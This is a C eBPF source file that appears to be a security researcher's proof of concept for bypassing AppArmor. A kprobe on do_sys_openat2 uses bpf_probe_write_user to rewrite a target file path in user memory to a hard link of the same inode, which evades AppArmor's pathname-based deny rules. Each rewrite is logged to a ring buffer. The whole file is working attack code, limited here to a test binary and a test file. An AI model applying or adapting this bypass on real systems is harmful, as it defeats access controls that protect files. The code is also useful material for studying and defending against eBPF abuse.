// SPDX-License-Identifier: GPL-2.0
// BPF LSM Policy Override - AppArmor Bypass via Pathname Rewriting
// Author: Azizcan Daştan (Milenium Security)
//
// Attack: Rewrites user-space filename in openat2() before AppArmor checks it.
// AppArmor is pathname-based, so redirecting to a hard link of the same inode
// bypasses the deny rule while accessing identical file content.

#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>

#define TARGET_PATH "/tmp/secret_test_file.txt"
#define TARGET_LEN  25  // strlen(TARGET_PATH)
#define BYPASS_PATH "/tmp/.aa_bypass_link\0\0\0\0\0"
#define BYPASS_LEN  21  // strlen("/tmp/.aa_bypass_link") + null

#define MAX_PATH_LEN 256

struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, 256 * 1024);
} events SEC(".maps");

struct event {
    __u32 pid;
    __u32 tgid;
    char comm[16];
    char original_path[MAX_PATH_LEN];
    char rewritten_path[MAX_PATH_LEN];
    __u8 rewritten;
};

SEC("kprobe/do_sys_openat2")
int BPF_KPROBE(bypass_apparmor, int dfd, const char *filename, struct open_how *how)
{
    char path_buf[MAX_PATH_LEN] = {};
    char comm[16] = {};

    bpf_get_current_comm(&comm, sizeof(comm));

    // Only target our test binary
    if (comm[0] != 't' || comm[1] != 'e' || comm[2] != 's' || comm[3] != 't' ||
        comm[4] != '_' || comm[5] != 'r' || comm[6] != 'e' || comm[7] != 'a' ||
        comm[8] != 'd' || comm[9] != 'e' || comm[10] != 'r' || comm[11] != 0)
        return 0;

    int ret = bpf_probe_read_user_str(path_buf, sizeof(path_buf), filename);
    if (ret < 0)
        return 0;

    // Check if this is our target file
    if (path_buf[0]  != '/' || path_buf[1]  != 't' || path_buf[2]  != 'm' ||
        path_buf[3]  != 'p' || path_buf[4]  != '/' || path_buf[5]  != 's' ||
        path_buf[6]  != 'e' || path_buf[7]  != 'c' || path_buf[8]  != 'r' ||
        path_buf[9]  != 'e' || path_buf[10] != 't' || path_buf[11] != '_' ||
        path_buf[12] != 't' || path_buf[13] != 'e' || path_buf[14] != 's' ||
        path_buf[15] != 't')
        return 0;

    // Rewrite the user-space filename to the hard link path
    char bypass[] = "/tmp/.aa_bypass_link";
    ret = bpf_probe_write_user((void *)filename, bypass, sizeof(bypass));

    // Log the event
    struct event *e = bpf_ringbuf_reserve(&events, sizeof(*e), 0);
    if (e) {
        e->pid = bpf_get_current_pid_tgid() & 0xFFFFFFFF;
        e->tgid = bpf_get_current_pid_tgid() >> 32;
        __builtin_memcpy(e->comm, comm, 16);
        __builtin_memcpy(e->original_path, path_buf, MAX_PATH_LEN);
        if (ret == 0) {
            e->rewritten = 1;
            char bp[] = "/tmp/.aa_bypass_link";
            __builtin_memcpy(e->rewritten_path, bp, sizeof(bp));
        } else {
            e->rewritten = 0;
        }
        bpf_ringbuf_submit(e, 0);
    }

    return 0;
}

char LICENSE[] SEC("license") = "GPL";
